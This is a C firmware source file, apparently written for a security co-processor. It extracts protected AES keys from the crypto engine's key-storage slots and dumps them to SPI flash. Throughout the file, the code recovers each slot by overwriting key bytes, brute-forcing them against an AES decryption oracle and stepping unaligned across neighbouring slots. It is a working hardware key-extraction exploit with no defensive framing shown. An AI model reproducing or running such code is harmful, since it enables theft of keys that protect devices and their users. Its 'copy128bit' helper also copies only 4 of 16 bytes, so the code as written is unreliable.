#include <stdalign.h>
#include <stdint.h>

#define u8 uint8_t
#define u16 uint16_t
#define u32 uint32_t



#define MAGIC_REG ((volatile u32*) 0x3006000)

void magic_init() {
    *MAGIC_REG = 1;
}



//#define SMN_FLASH_ADDR ((u32) 0xa0)
#define SMN_FLASH_ADDR ((u32) 0x440)
#define SMN_SLOT_CTRL ((volatile u32*) 0x3220000)
#define SMN_SLOT_MAP ((volatile u32*) 0x1000000)

void spi_init() {
    for (u32 i = 0; i < 16; i++)
        SMN_SLOT_CTRL[i] = 0;
    *SMN_SLOT_CTRL = SMN_FLASH_ADDR;
}

void write_words_to_spi(u32 offset, u32* output, u32 count) {
    for (u32 i = 0; i < count; i++)
        SMN_SLOT_MAP[(offset>>2) + i] = *output++;
}



#define CCP_CTRL ((volatile u32*) 0x3001000)
#define CCP_TAIL ((volatile u32*) 0x3001004)
#define CCP_HEAD ((volatile u32*) 0x3001008)
#define CCP_STATUS ((volatile u32*) 0x3001100)

#define SLOT_COUNT 0x100
// lsb address range 0x0 to 0x1000

enum {
    X86_MEM = 0,
    LSB_MEM = 1,
    PSP_MEM = 2,
};

#define AES_BASE ((u32) 0x13)

#define AES_MODE ((u32) 0x3e000)
#define AES_ECB  ((u32) 0x0)

#define AES_DIR     ((u32) 0x1000)
#define AES_DECRYPT ((u32) 0x0000)
#define AES_ENCRYPT ((u32) 0x1000)

#define AES_TYPE ((u32) 0xc0000)
#define AES_128  ((u32) 0x00000)
#define AES_192  ((u32) 0x40000)
#define AES_256  ((u32) 0x80000)

typedef struct {
    u32 low;
    u16 high;
    u16 type;
} ccp_addr;

#define CCP_ADDR_SET_LOCAL(ca, ptr) \
    ca.low = (u32) (ptr); \
    ca.high = 0; \
    ca.type = PSP_MEM
#define CCP_ADDR_SET_LSB(ca, offset) \
    ca.low = (u32) (offset); \
    ca.high = 0; \
    ca.type = LSB_MEM

typedef struct {
    alignas(32) u32 control;
    u32 length;
    ccp_addr src;
    ccp_addr dest;
    ccp_addr key;
} ccp_request;

#define CCP_SRC_SET_LOCAL(cc, ptr) \
    CCP_ADDR_SET_LOCAL(cc.src, ptr)
#define CCP_SRC_SET_LSB(cc, offset) \
    CCP_ADDR_SET_LSB(cc.src, offset)

#define CCP_DEST_SET_LOCAL(cc, ptr) \
    CCP_ADDR_SET_LOCAL(cc.dest, ptr)
#define CCP_DEST_SET_LSB(cc, offset) \
    CCP_ADDR_SET_LSB(cc.dest, offset)

#define CCP_KEY_SET_LOCAL(cc, ptr) \
    CCP_ADDR_SET_LOCAL(cc.key, ptr)
#define CCP_KEY_SET_LSB(cc, offset) \
    CCP_ADDR_SET_LSB(cc.key, offset)

u32 execute_ccp_req(ccp_request* req) {
    *CCP_HEAD = (u32) req;
    *CCP_TAIL = (u32) &req[1];
    //*CCP_CTRL = (((u32) req) << 0x10) | 0x15;
    *CCP_CTRL = 0x17;
    while (0b1 & *CCP_CTRL);
    while (!(0b10 & *CCP_CTRL));
    return *CCP_STATUS & 0b1111111;
}

void copy128bit(u8 * src, u8 * dest) {
    for (u8 i = 0; i < 4; i++) dest[i] = src[i];
}

void copy(u8 * src, u8 * dest, u32 length) {
    for (u8 i = 0; i < length; i++) dest[i] = src[i];
}

alignas(16) u8 NULL_STRING[16];
alignas(16) u8 AES_KEY[16];
alignas(16) u8 BUFFER[16];

ccp_request AES_REQUEST = {
    .control = 0x13,
    .length = 16,
};

u32 aes128_ecb_decrypt_null(u8 * key, u8 * output) {
    copy128bit(key, AES_KEY);
    CCP_SRC_SET_LOCAL(AES_REQUEST, NULL_STRING);
    CCP_KEY_SET_LOCAL(AES_REQUEST, AES_KEY);
    CCP_DEST_SET_LOCAL(AES_REQUEST, BUFFER);
    u32 rc = execute_ccp_req(&AES_REQUEST);
    if (rc) return rc;
    copy128bit(BUFFER, output);
    return 0;
}

u32 aes128_ecb_decrypt_lsb_null(u32 lsb_addr, u8 * output) {
    CCP_SRC_SET_LOCAL(AES_REQUEST, NULL_STRING);
    CCP_KEY_SET_LSB(AES_REQUEST, lsb_addr);
    CCP_DEST_SET_LOCAL(AES_REQUEST, BUFFER);
    u32 rc = execute_ccp_req(&AES_REQUEST);
    if (rc) return rc;
    copy128bit(BUFFER, output);
    return 0;
}




#define PASSTHRU_COPY ((u32) 0x500011)

ccp_request COPY_REQUEST = {
    .control = PASSTHRU_COPY,
};

u32 copy128bit_from_lsb(u32 lsb_addr, u8 * dest) {
    COPY_REQUEST.length = 16;
    CCP_SRC_SET_LSB(COPY_REQUEST, lsb_addr);
    CCP_DEST_SET_LOCAL(COPY_REQUEST, BUFFER);
    u32 rc = execute_ccp_req(&COPY_REQUEST);
    if (rc) return rc;
    copy128bit(BUFFER, dest);
    return 0;
}

u32 copy_to_lsb(u8 * src, u32 lsb_addr, u32 length) {
    COPY_REQUEST.length = length;
    copy(src, BUFFER, length);
    CCP_SRC_SET_LOCAL(COPY_REQUEST, BUFFER);
    CCP_DEST_SET_LSB(COPY_REQUEST, lsb_addr);
    return execute_ccp_req(&COPY_REQUEST);
}

u8 compare128bit(u8 * a, u8 * b) {
    for (uint8_t i = 0; i < 16; i++) {
        u8 diff = a[i] - b[i];
        if (diff) return diff;
    }
    return 0;
}

u32 try_extract_lsb_slot_with_aes128_ecb(u32 slot, u8 * output) {

    u32 key_lsb_addr = slot << 4;

    // this is aes_ecb_decrypt(lsb_key, nullstr)
    u8 correct_decrypt[16];
    u32 rc = aes128_ecb_decrypt_lsb_null(key_lsb_addr, correct_decrypt);
    if (rc) return rc | 0x1000000;

    u8 key[16];
    u8 buffer[16];

    // brute force each byte start to end
    for (u32 pos = 0; pos < 16; pos++) {

        // brute force byte nr i
        for (u8 byte_value = 0;; byte_value++) {

            // set the currently checked byte
            key[pos] = byte_value;

            // also set this byte in the lsb
            rc = copy_to_lsb(key, key_lsb_addr, pos+1);
            if (rc) return rc | 0x2000000 | (pos << 16);

            // repeat decrypt operation
            rc = aes128_ecb_decrypt_lsb_null(key_lsb_addr, buffer);
            if (rc) return rc | 0x3000000 | (pos << 16);

            // check is key byte is correct
            if (compare128bit(correct_decrypt, buffer) == 0)
                break;

            // check if we have failed
            if (byte_value == 0xff)
                return 0x4000000;
        }
    }

    // the key is correct
    copy128bit(key, output);

    return 0;
}

u32 try_extract_lsb_slot_with_unaligned_aes128_ecb_from_neighbour (u32 slot, u8 * neighbour_content, u32 forward, u8 * output) {

    u32 rc;

    // these three variables are (almost) always consistent
    u32 lsb_addr;       // start of a buffer in lsb memory
    u8 decrypt[16];     // holds: aes128_ecb_decrypt(key=lsb_content, nullstr)
    u8 lsb_content[16]; // the contents of this buffer

    // initialize them
    lsb_addr = slot << 4;
    if (forward) // e.g. trying to extract slot 5 (0x50) from slot 4 (0x40)
        lsb_addr -= 0x10;
    else // aka backward, e.g. trying to extract slot 5 (0x50) from slot 6 (0x60)
        lsb_addr += 0x10;
    rc = aes128_ecb_decrypt_lsb_null(lsb_addr, decrypt);
    if (rc) return rc | 0x10000000;
    copy128bit(neighbour_content, lsb_content);

    // sanity check
    u8 buffer[16];
    rc = aes128_ecb_decrypt_null(lsb_content, buffer);
    if (rc) return rc | 0x20000000;

    if (compare128bit(buffer, decrypt) != 0) {
        write_words_to_spi(0x100000, (u32*) &buffer, 4);
        write_words_to_spi(0x100010, (u32*) &decrypt, 4);
        write_words_to_spi(0x100020, (u32*) &lsb_content, 4);
        write_words_to_spi(0x100040, &lsb_addr, 1);
        return 0x30000000;
    }

    // move lsb_addr to destination one byte at a time
    do {

        // go to next byte
        if (forward) {
            lsb_addr += 1;
            for (u8 i = 0; i < 0xf; i++)
                lsb_content[i] = lsb_content[i+1];
        } else {
            lsb_addr -= 1;
            for (u8 i = 0xf; 0 < i; i--)
                lsb_content[i] = lsb_content[i-1];
        }
        rc = aes128_ecb_decrypt_lsb_null(lsb_addr, decrypt);
        if (rc) return rc | 0x40000000;

        // brute force the remaining byte of lsb_content
        for (u8 byte_value = 0;; byte_value++) {

            // set current byte
            if (forward)
                lsb_content[0xf] = (u8) byte_value;
            else
                lsb_content[0x0] = (u8) byte_value;

            // calculate decrypt
            rc = aes128_ecb_decrypt_null(lsb_content, buffer);
            if (rc) return rc | 0x50000000;

            // check if correct
            if (compare128bit(buffer, decrypt) == 0)
                break;

            // have we failed?
            if (byte_value == 0xff)
                return 0x60000000;
        }

    } while (lsb_addr != (slot << 4));

    // write output
    copy128bit(lsb_content, output);

    return 0;
}

u32 token = 0xaa55aa55;

int extract_first_slot(u8 * output) {

    u32 rc;
    u32 slot = 0;

    // get any slot 
    do {

        // try just copying the slot
        rc = copy128bit_from_lsb(slot << 4, output);
        if (rc == 0) break; // success
        else write_words_to_spi(slot << 8, &rc, 1); // debug print

        // try our brute force method
        rc = try_extract_lsb_slot_with_aes128_ecb(slot, output);
        if (rc == 0) break; // success
        else write_words_to_spi((slot << 8) + 4, &rc, 1); // debug print

    } while (++slot < SLOT_COUNT);

    // we are done if the first slot worked
    if (slot == 0) return 0;

    // if even the last one did not work, then we can't do it
    if (slot == SLOT_COUNT) return -1;

    // use our brute force method to get access to the contents of the first slot
    while (slot--) {

        rc = try_extract_lsb_slot_with_unaligned_aes128_ecb_from_neighbour(slot, output, 0, output);
        if (rc) return rc;

        write_words_to_spi(slot << 8, &token, 1); // debug print
    }

    return 0;
}

u32 extract_slot_from_last(u32 slot, u8 * last_and_output) {

    if (copy128bit_from_lsb(slot << 4, last_and_output) == 0)
        return 0;

    if (try_extract_lsb_slot_with_aes128_ecb(slot, last_and_output) == 0)
        return 0;

    return try_extract_lsb_slot_with_unaligned_aes128_ecb_from_neighbour(slot, last_and_output, 1, last_and_output);
}

// 0xFA11ED in big-endian
u32 failed = 0xED11FA;

void print_failed(u32 slot, u32 rc) {
    write_words_to_spi(slot << 4, &rc, 1);
    write_words_to_spi((slot << 4) + 4, &failed, 1);
}

void dump_each_slot() {
    u8 output[16];

    u32 slot = 0;
    u32 rc = extract_first_slot(output);
    if (rc) {
        print_failed(slot, rc);
        return;
    }
    write_words_to_spi(slot << 4, (u32*) &output, 4);

    while (++slot < SLOT_COUNT) {
        rc = extract_slot_from_last(slot, output);
        if (rc) {
            print_failed(slot, rc);
            return;
        }
        write_words_to_spi(slot << 4, (u32*) &output, 4);
    }
}

int main () {

    magic_init();
    spi_init();

    // sanity checks
    write_words_to_spi(0x10000, (u32*) "Hello, world!\0\0\0\0", 4);

    u8 buffer[16];

    u32 rc = copy128bit_from_lsb(0x40, buffer);
    if (rc) print_failed(0x200, rc);
    else write_words_to_spi(0x200 << 4, (u32*) &buffer, 4);

    rc = try_extract_lsb_slot_with_aes128_ecb(8, buffer);
    if (rc) print_failed(0x300, rc);
    else write_words_to_spi(0x300 << 4, (u32*) &buffer, 4);

    // the real work
    dump_each_slot();

#if 0
    for (u32 slot = 0x0; slot < 0x1000; slot++) {
        u32 rc = dump_lsb_slot_with_aes128_ecb(slot << 4);
    }

    // try just copy -> doesn't work

    u32 rc;
    AES_REQUEST.control = AES_BASE | AES_256 | AES_DECRYPT | AES_ECB;
    AES_REQUEST.length = 0x20;
    u32 output[8];
    CCP_DEST_SET_LOCAL(AES_REQUEST, output);



    // try aes unaligned
    CCP_SRC_SET_LOCAL(AES_REQUEST, NULL_STRING);
    for (u32 start = 0; start < 0x20; start ++) {
        CCP_KEY_SET_LSB(AES_REQUEST, start);
        rc = execute_ccp_req(&AES_REQUEST);
        if (rc) {
            write_words_to_spi(start << 8, &rc, 1);
        } else {
            write_words_to_spi(start << 8, output, 8);
        }
    }


    // try aes src
    CCP_SRC_SET_LSB(AES_REQUEST, 0);
    CCP_KEY_SET_LOCAL(AES_REQUEST, NULL_STRING);
    rc = execute_ccp_req(&AES_REQUEST);
    if (rc) {
        write_words_to_spi(0x5000, &rc, 1);
    } else {
        write_words_to_spi(0x5000, output, 8);
    }

    u32 slot_0x20_bytes[4];
    u32 slot_0x20_error = dump_lsb_slot_with_aes128_ecb(0x20, slot_0x20_bytes);

    // try copy is LSB
    COPY_REQUEST.control = PASSTHRU_COPY;
    COPY_REQUEST.length = 0x20;

    CCP_SRC_SET_LSB(COPY_REQUEST, 0x0);
    CCP_DEST_SET_LSB(COPY_REQUEST, 0x20);
    rc = execute_ccp_req(&COPY_REQUEST);
    if (rc) {
        write_words_to_spi(0x6000, &rc, 1);
    }

    CCP_SRC_SET_LSB(COPY_REQUEST, 0x20);
    CCP_DEST_SET_LOCAL(COPY_REQUEST, output);
    rc = execute_ccp_req(&COPY_REQUEST);
    if (rc) {
        write_words_to_spi(0x6004, &rc, 1);
    } else {
        write_words_to_spi(0x6010, output, 8);
    }

#endif

    return 0;
}



